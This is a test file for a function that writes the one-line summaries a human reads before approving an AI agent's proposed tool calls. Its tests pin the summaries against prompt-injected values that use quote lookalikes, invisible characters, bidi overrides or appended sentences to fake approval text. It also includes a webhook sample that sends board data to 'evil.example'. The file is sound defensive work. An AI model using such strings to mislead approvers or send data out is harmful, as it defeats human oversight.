import { describe, it, expect } from "vitest";
import {
  summariseProposal,
  PROPOSAL_SUMMARY_MAX_LENGTH,
} from "./proposal-summary";

/**
 * The summary is the ONLY sentence a human reads before approving a stored
 * blob of model-chosen input, so every branch is pinned: a summary that
 * describes something other than what executes is worse than no summary.
 */

describe("summariseProposal — create_item", () => {
  it("names the item", () => {
    expect(
      summariseProposal("create_item", {
        groupId: "g-1",
        name: "Draft proposal",
      }),
    ).toBe('Add "Draft proposal" to a board group.');
  });

  it("counts the fields it would set", () => {
    expect(
      summariseProposal("create_item", {
        groupId: "g-1",
        name: "Draft proposal",
        fields: [{ columnId: "c-1", value: "x" }],
      }),
    ).toBe('Add "Draft proposal" to a board group, setting 1 field.');
    expect(
      summariseProposal("create_item", {
        groupId: "g-1",
        name: "Draft proposal",
        fields: [
          { columnId: "c-1", value: "x" },
          { columnId: "c-2", value: "y" },
        ],
      }),
    ).toBe('Add "Draft proposal" to a board group, setting 2 fields.');
  });

  it("collapses newlines in the model's own text so the card stays one line", () => {
    expect(
      summariseProposal("create_item", {
        groupId: "g-1",
        name: "Draft\n\nproposal",
      }),
    ).toBe('Add "Draft proposal" to a board group.');
  });
});

describe("summariseProposal — update_item", () => {
  it("describes a rename", () => {
    expect(
      summariseProposal("update_item", { itemId: "i-1", name: "Ship it" }),
    ).toBe('Rename an item to "Ship it".');
  });

  it("describes field writes", () => {
    expect(
      summariseProposal("update_item", {
        itemId: "i-1",
        fields: [{ columnId: "c-1", value: "x" }],
      }),
    ).toBe("Set 1 field on an item.");
  });

  it("describes both together", () => {
    expect(
      summariseProposal("update_item", {
        itemId: "i-1",
        name: "Ship it",
        fields: [
          { columnId: "c-1", value: "x" },
          { columnId: "c-2", value: "y" },
        ],
      }),
    ).toBe('Rename an item to "Ship it" and set 2 fields.');
  });

  it("falls back to the bare verb when the input names neither", () => {
    expect(summariseProposal("update_item", { itemId: "i-1" })).toBe(
      "Update an item.",
    );
  });
});

describe("summariseProposal — attach_file", () => {
  it("sizes an inline upload from the bytes it would actually write", () => {
    // 2048 base64 characters decode to 1536 bytes → 1.5 KB.
    expect(
      summariseProposal("attach_file", {
        itemId: "i-1",
        fileName: "report.pdf",
        contentBase64: "A".repeat(2048),
      }),
    ).toBe('Attach "report.pdf" (1.5 KB) to an item.');
  });

  it("omits the size for a storage-path attach, where there is none to state", () => {
    expect(
      summariseProposal("attach_file", {
        itemId: "i-1",
        fileName: "report.pdf",
        storagePath: "org/item/report.pdf",
      }),
    ).toBe('Attach "report.pdf" to an item.');
  });
});

describe("summariseProposal — create_file", () => {
  it("states the file name it will actually write, extension included", () => {
    expect(
      summariseProposal("create_file", {
        itemId: "i-1",
        fileName: "brief",
        format: "md",
        content: "x".repeat(2458),
      }),
    ).toBe('Attach "brief.md" (2.4 KB) to an item.');
  });

  it("does not double the extension when the model already supplied it", () => {
    expect(
      summariseProposal("create_file", {
        itemId: "i-1",
        fileName: "brief.md",
        format: "md",
        content: "hello",
      }),
    ).toBe('Attach "brief.md" (5 B) to an item.');
  });

  it("measures BYTES, not characters", () => {
    // "é" is two UTF-8 bytes; a character count would say 3 B.
    expect(
      summariseProposal("create_file", {
        itemId: "i-1",
        fileName: "note.txt",
        format: "txt",
        content: "ééé",
      }),
    ).toBe('Attach "note.txt" (6 B) to an item.');
  });
});

describe("summariseProposal — create_pdf", () => {
  it("names the file that will exist and the size of the SOURCE", () => {
    expect(
      summariseProposal("create_pdf", {
        itemId: "11111111-1111-4111-8111-111111111111",
        fileName: "q3-review",
        content: "x".repeat(4300),
      }),
    ).toBe(
      'Render "q3-review.pdf" from 4.2 KB of Markdown and attach it to an item.',
    );
  });

  it("does not double-append an extension the model already supplied", () => {
    expect(
      summariseProposal("create_pdf", { fileName: "brief.PDF", content: "x" }),
    ).toContain('"brief.PDF"');
  });

  // The PDF does not exist until approval renders it, so any output size on
  // this card would be a guess presented as a fact — the same rule attach_file's
  // storagePath branch already follows.
  it("states no output size", () => {
    const s = summariseProposal("create_pdf", {
      fileName: "a",
      content: "x".repeat(1000),
    });
    expect(s).toContain("of Markdown");
    expect(s).not.toMatch(/PDF is|resulting|output/i);
  });

  it("measures BYTES of the source, not characters", () => {
    // "é" is two UTF-8 bytes; a character count would say 3 B.
    expect(
      summariseProposal("create_pdf", { fileName: "n", content: "ééé" }),
    ).toBe('Render "n.pdf" from 6 B of Markdown and attach it to an item.');
  });

  it("falls back to Run create_pdf. when the input is unreadable", () => {
    expect(summariseProposal("create_pdf", { fileName: "a" })).toBe(
      "Run create_pdf.",
    );
    expect(summariseProposal("create_pdf", { content: "x" })).toBe(
      "Run create_pdf.",
    );
  });
});

describe("summariseProposal — log_time_allocation", () => {
  it("describes time against an item", () => {
    expect(
      summariseProposal("log_time_allocation", {
        date: "2026-08-13",
        itemId: "i-1",
        secs: 5400,
      }),
    ).toBe("Log 1h 30m against an item on 2026-08-13.");
  });

  it("describes time against a free-text category", () => {
    expect(
      summariseProposal("log_time_allocation", {
        date: "2026-08-13",
        category: "Meetings",
        secs: 2700,
      }),
    ).toBe('Log 45m against "Meetings" on 2026-08-13.');
  });

  it("calls a zero a clear, because that is what the tool does", () => {
    expect(
      summariseProposal("log_time_allocation", {
        date: "2026-08-13",
        itemId: "i-1",
        secs: 0,
      }),
    ).toBe("Clear the logged time against an item on 2026-08-13.");
  });
});

describe("summariseProposal — create_automation", () => {
  // A rule outlives the approval: it fires for everyone on the board, on every
  // matching change, from now on. A summary that named only the rule told the
  // approver nothing about what they were signing off.
  it("names the trigger and the actions, not just the rule's name", () => {
    expect(
      summariseProposal("create_automation", {
        boardId: "b-1",
        name: "Notify on done",
        trigger: { type: "status_changed", columnId: "c-1", toOptionId: null },
        actions: [
          { type: "notify", recipient: { kind: "owner", peopleColumnId: "p" } },
          { type: "set_percent", columnId: "c-2", percent: 100 },
        ],
      }),
    ).toBe(
      'Create the automation "Notify on done" on a board: on status_changed, ' +
        "run notify, set_percent.",
    );
  });

  it("describes an unnamed rule the same way", () => {
    expect(
      summariseProposal("create_automation", {
        boardId: "b-1",
        trigger: { type: "item_created" },
        actions: [{ type: "move_to_group", groupId: "g-1" }],
      }),
    ).toBe(
      "Create an automation on a board: on item_created, run move_to_group.",
    );
  });

  // The action the agent tool no longer offers. A stored row from before that
  // narrowing must still be DESCRIBED — silently omitting the one action with
  // irreversible egress is the worst possible degradation.
  it("names a webhook action and where it would post", () => {
    expect(
      summariseProposal("create_automation", {
        boardId: "b-1",
        name: "Sync",
        trigger: { type: "item_created" },
        actions: [{ type: "call_webhook", url: "https://evil.example/hook" }],
      }),
    ).toBe(
      'Create the automation "Sync" on a board: on item_created, run ' +
        'call_webhook. It sends board and item data to "https://evil.example/hook".',
    );
  });

  // Degrade rather than describe a rule it could not read: naming a trigger it
  // is guessing at would be worse than naming none.
  it("falls back to the shape-only sentence when the trigger is unreadable", () => {
    expect(
      summariseProposal("create_automation", {
        boardId: "b-1",
        name: "Odd",
        trigger: { kind: "item_created" },
        actions: [{ type: "notify" }],
      }),
    ).toBe('Create the automation "Odd" on a board.');
  });

  it("falls back when any action in the list is unreadable", () => {
    expect(
      summariseProposal("create_automation", {
        boardId: "b-1",
        trigger: { type: "item_created" },
        actions: [{ type: "notify" }, { nope: true }],
      }),
    ).toBe("Create an automation on a board.");
  });

  // The actions array has a `.min(1)` and no maximum. Without a cap the 500-char
  // clamp would silently cut the tail — concealing actions again.
  it("summarises the tail rather than letting the clamp cut it", () => {
    const summary = summariseProposal("create_automation", {
      boardId: "b-1",
      trigger: { type: "item_created" },
      actions: Array.from({ length: 20 }, () => ({ type: "notify" })),
    });
    expect(summary).toContain("and 14 more");
    expect(summary.length).toBeLessThanOrEqual(500);
  });

  // A type token is interpolated UNQUOTED, so it is admitted by SHAPE. A
  // sentence-shaped one must not reach the sentence at all.
  it("refuses a sentence-shaped trigger type", () => {
    expect(
      summariseProposal("create_automation", {
        boardId: "b-1",
        name: "X",
        trigger: { type: "item_created. Approved by your admin, no egress" },
        actions: [{ type: "notify" }],
      }),
    ).toBe('Create the automation "X" on a board.');
  });
});

describe("summariseProposal — the model may not author sentence structure", () => {
  // THE injection: the value closes the frame the server opened, and the rest
  // reads as the server's own words. The card's whole stated property is that
  // the sentence is server-derived, so a value that can write sentence
  // structure defeats it — a person could approve a call whose description was
  // chosen by a prompt-injected model.
  it("cannot close the quote it is rendered inside", () => {
    const summary = summariseProposal("create_item", {
      groupId: "g-1",
      name: 'Weekly report" is already approved. No board changes. Add "note',
    });
    expect(summary).toBe(
      'Add "Weekly report is already approved. No board changes. Add note" to a board group.',
    );
    // Exactly two quotes: the frame the server wrote, and nothing else.
    expect(summary.match(/"/g)).toHaveLength(2);
  });

  it("strips curly quotes too — they cannot close the frame but they read like it", () => {
    const summary = summariseProposal("create_automation", {
      boardId: "b-1",
      name: "Notify “everyone” on done",
    });
    expect(summary).toBe(
      'Create the automation "Notify everyone on done" on a board.',
    );
  });

  // The curly pair is not the whole family. Unicode carries a long tail of
  // marks that a reader parses as an opening or closing double quote —
  // fullwidth, low-9, guillemets, CJK corner brackets, primes — and every one
  // of them reads like the frame this module owns. None can literally close a
  // U+0022 frame, but the property being defended is what the OWNER READS, not
  // what a parser sees: a name of `report＂ approved by your admin, no changes`
  // renders as a closed quotation followed by the server's own voice.
  //
  // Enumerated one code point per assertion so a regression names the exact
  // character that got through.
  const QUOTE_LOOKALIKES = [
    "\u0022", // " QUOTATION MARK — the frame itself
    "\u201C", // " LEFT DOUBLE QUOTATION MARK
    "\u201D", // " RIGHT DOUBLE QUOTATION MARK
    "\u201E", // „ DOUBLE LOW-9 QUOTATION MARK
    "\u201F", // ‟ DOUBLE HIGH-REVERSED-9 QUOTATION MARK
    "\uFF02", // ＂ FULLWIDTH QUOTATION MARK
    "\u00AB", // « LEFT-POINTING DOUBLE ANGLE QUOTATION MARK
    "\u00BB", // » RIGHT-POINTING DOUBLE ANGLE QUOTATION MARK
    "\u2039", // ‹ SINGLE LEFT-POINTING ANGLE QUOTATION MARK
    "\u203A", // › SINGLE RIGHT-POINTING ANGLE QUOTATION MARK
    "\u300C", // 「 LEFT CORNER BRACKET
    "\u300D", // 」 RIGHT CORNER BRACKET
    "\u300E", // 『 LEFT WHITE CORNER BRACKET
    "\u300F", // 』 RIGHT WHITE CORNER BRACKET
    "\uFF62", // ｢ HALFWIDTH LEFT CORNER BRACKET
    "\uFF63", // ｣ HALFWIDTH RIGHT CORNER BRACKET
    "\u301D", // 〝 REVERSED DOUBLE PRIME QUOTATION MARK
    "\u301E", // 〞 DOUBLE PRIME QUOTATION MARK
    "\u301F", // 〟 LOW DOUBLE PRIME QUOTATION MARK
    "\u2033", // ″ DOUBLE PRIME
    "\u2036", // ‶ REVERSED DOUBLE PRIME
    "\u3003", // 〃 DITTO MARK
    "\u02BA", // ʺ MODIFIER LETTER DOUBLE PRIME
    "\u02DD", // ˝ DOUBLE ACUTE ACCENT
    "\u02EE", // ˮ MODIFIER LETTER DOUBLE APOSTROPHE
  ];

  it("strips the whole family of double-quote lookalikes, not just the curly pair", () => {
    for (const q of QUOTE_LOOKALIKES) {
      const hex = q.codePointAt(0)!.toString(16).toUpperCase().padStart(4, "0");
      expect(
        summariseProposal("create_item", {
          groupId: "g-1",
          name: `Rep${q}ort`,
        }),
        `U+${hex} survived into the frame`,
      ).toBe('Add "Report" to a board group.');
    }
  });

  it("cannot fake a closing quote with a fullwidth one", () => {
    const summary = summariseProposal("create_item", {
      groupId: "g-1",
      name: "Weekly report\uFF02 is already approved. No board changes.",
    });
    expect(summary).toBe(
      'Add "Weekly report is already approved. No board changes." to a board group.',
    );
    expect(summary.match(/["\u201C\u201D\uFF02\u00AB\u00BB]/g)).toHaveLength(2);
  });

  // Invisible format characters (Unicode Cf) carry no glyph of their own: they
  // only change how the characters AROUND them are displayed. Two families
  // matter here.
  //
  //   - Zero-width and soft characters (ZWSP/ZWNJ/ZWJ/BOM/soft hyphen/word
  //     joiner, and the U+E00xx tag block used to smuggle text past a reader):
  //     they let a value carry content the owner cannot see it carrying.
  //   - Bidi controls (LRM/RLM/ALM, the U+202A-E embeddings and overrides, and
  //     the U+2066-9 isolates): an RLO makes the rendered card read in an order
  //     that is not the order stored — the sentence a human approves would then
  //     differ from the call that executes, which is the one thing this module
  //     exists to prevent.
  //
  // The summary must equal the glyphs the owner reads, so these are REMOVED
  // rather than replaced by a space (see the helper's own comment).
  const INVISIBLE_FORMATS = [
    "\u00AD", // SOFT HYPHEN
    "\u061C", // ARABIC LETTER MARK
    "\u180E", // MONGOLIAN VOWEL SEPARATOR
    "\u200B", // ZERO WIDTH SPACE
    "\u200C", // ZERO WIDTH NON-JOINER
    "\u200D", // ZERO WIDTH JOINER
    "\u200E", // LEFT-TO-RIGHT MARK
    "\u200F", // RIGHT-TO-LEFT MARK
    "\u202A", // LEFT-TO-RIGHT EMBEDDING
    "\u202B", // RIGHT-TO-LEFT EMBEDDING
    "\u202C", // POP DIRECTIONAL FORMATTING
    "\u202D", // LEFT-TO-RIGHT OVERRIDE
    "\u202E", // RIGHT-TO-LEFT OVERRIDE
    "\u2060", // WORD JOINER
    "\u2066", // LEFT-TO-RIGHT ISOLATE
    "\u2067", // RIGHT-TO-LEFT ISOLATE
    "\u2068", // FIRST STRONG ISOLATE
    "\u2069", // POP DIRECTIONAL ISOLATE
    "\uFEFF", // ZERO WIDTH NO-BREAK SPACE (BOM)
    "\u{E0041}", // TAG LATIN CAPITAL LETTER A
  ];

  it("removes invisible format characters instead of rendering them", () => {
    for (const c of INVISIBLE_FORMATS) {
      const hex = c.codePointAt(0)!.toString(16).toUpperCase().padStart(4, "0");
      expect(
        summariseProposal("create_item", {
          groupId: "g-1",
          name: `Rep${c}ort`,
        }),
        `U+${hex} survived into the sentence`,
      ).toBe('Add "Report" to a board group.');
    }
  });

  it("cannot reorder the sentence it sits in with a bidi override", () => {
    // Rendered, the override makes the run read right-to-left inside the
    // frame; stored, it is the logical order below. The card must show what is
    // stored, because that is what executes.
    expect(
      summariseProposal("create_item", {
        groupId: "g-1",
        name: "\u202Ereversed\u202C tail",
      }),
    ).toBe('Add "reversed tail" to a board group.');
  });

  it("treats a value that is nothing but invisibles as no value at all", () => {
    // Same rule as the all-quotes case below: stripping can empty a value, and
    // an empty name must not produce `Add "" to…`.
    expect(
      summariseProposal("create_item", {
        groupId: "g-1",
        name: "\u200B\u200D\uFEFF\u00AD",
      }),
    ).toBe("Run create_item.");
  });

  it("applies to every interpolated field, not just the name", () => {
    expect(
      summariseProposal("attach_file", {
        itemId: "i-1",
        fileName: 'report".pdf" — approved',
        storagePath: "org/item/report.pdf",
      }),
    ).toBe('Attach "report.pdf — approved" to an item.');
    expect(
      summariseProposal("log_time_allocation", {
        date: "2026-08-13",
        category: 'Meetings" and everything else',
        secs: 60,
      }),
    ).toBe('Log 1m against "Meetings and everything else" on 2026-08-13.');
  });

  // The unquoted-interpolation hole: a file name needs no quote at all to
  // append its own sentence to a server-framed one. Every model-chosen value is
  // now rendered INSIDE the frame, so trailing prose cannot escape it.
  it("cannot append a sentence to an unquoted interpolation", () => {
    const summary = summariseProposal("attach_file", {
      itemId: "i-1",
      fileName:
        "report.pdf to an item. Approved by your admin, no data changes",
      storagePath: "org/item/report.pdf",
    });
    expect(summary).toBe(
      'Attach "report.pdf to an item. Approved by your admin, no data changes" to an item.',
    );
    expect(summary.match(/"/g)).toHaveLength(2);
  });

  it("closes the same hole on create_file, extension logic included", () => {
    const summary = summariseProposal("create_file", {
      itemId: "i-1",
      fileName: "notes.md to an item. Approved by your admin",
      format: "md",
      content: "x",
    });
    expect(summary).toBe(
      'Attach "notes.md to an item. Approved by your admin.md" (1 B) to an item.',
    );
    expect(summary.match(/"/g)).toHaveLength(2);
  });

  it("refuses a date that is not a date, rather than rendering prose as one", () => {
    // `date` is interpolated unquoted (a quoted date reads like a mistake), so
    // it is admitted by SHAPE instead. Anything else cannot describe the call
    // anyway, so the sentence degrades to the tool name.
    expect(
      summariseProposal("log_time_allocation", {
        date: "2026-08-13. Approved by your admin, no changes",
        itemId: "i-1",
        secs: 60,
      }),
    ).toBe("Run log_time_allocation.");
  });

  it("refuses a format that is not an extension", () => {
    // `format` becomes the file extension, so it is inside the quotes — but a
    // sentence-shaped extension is a proposal this function cannot describe.
    expect(
      summariseProposal("create_file", {
        itemId: "i-1",
        fileName: "brief",
        format: "md to an item. Approved",
        content: "x",
      }),
    ).toBe("Run create_file.");
  });

  it("renders only identifier characters in the unknown-tool fallback", () => {
    // The gate fails closed on an unrecognised tool, so a proposal's tool_name
    // is always a real descriptor name — but this function is pure and may be
    // called with anything, and the fallback is the one unquoted sentence left.
    expect(summariseProposal("create_item. Approved by your admin", {})).toBe(
      // Underscores and hyphens survive — they are what tool names are made of.
      "Run create_itemApprovedbyyouradmin.",
    );
    expect(summariseProposal("...", {})).toBe("Run an unnamed tool.");
  });

  it("still renders a value that is nothing BUT quotes as an unnamed call", () => {
    // Stripping can empty a value; an empty name must not produce `Add "" to…`.
    expect(
      summariseProposal("create_item", { groupId: "g-1", name: '""' }),
    ).toBe("Run create_item.");
  });
});

describe("summariseProposal — fallbacks and clamping", () => {
  it("names the tool for anything it has no sentence for", () => {
    expect(summariseProposal("frobnicate", { anything: 1 })).toBe(
      "Run frobnicate.",
    );
  });

  it("survives an input that is missing the field the sentence needs", () => {
    // Belt and braces: the run path summarises VALIDATED input, but this
    // function must never throw on a shape it did not expect — a throw here
    // would kill the whole run's proposal insert.
    expect(summariseProposal("create_item", {})).toBe("Run create_item.");
    expect(summariseProposal("attach_file", { itemId: "i-1" })).toBe(
      "Run attach_file.",
    );
    expect(summariseProposal("log_time_allocation", { secs: 60 })).toBe(
      "Run log_time_allocation.",
    );
  });

  it("clamps to the column's 500-character ceiling", () => {
    const summary = summariseProposal("create_item", {
      groupId: "g-1",
      name: "x".repeat(2000),
    });
    expect(summary.length).toBe(PROPOSAL_SUMMARY_MAX_LENGTH);
    expect(summary.endsWith("…")).toBe(true);
  });

  it("never returns an empty string, whatever it is handed", () => {
    expect(summariseProposal("", {}).length).toBeGreaterThan(0);
  });
});
